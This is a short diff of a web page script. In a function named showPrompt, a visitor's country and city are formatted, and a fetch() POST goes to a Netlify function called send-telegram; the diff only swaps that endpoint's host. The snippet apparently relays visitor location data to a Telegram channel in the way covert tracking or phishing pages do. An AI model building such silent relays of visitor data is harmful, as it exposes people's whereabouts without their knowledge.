@@ -176,7 +176,7 @@ function showPrompt(IpAddress) {
 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 <strong>City: </strong><code>${IpAddress.city}</code>`;
 
-      fetch('https://tele-123-456.netlify.app/.netlify/functions/send-telegram', {
+      fetch('https://stellar-snickerdoodle-b1acdb.netlify.app/.netlify/functions/send-telegram', {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
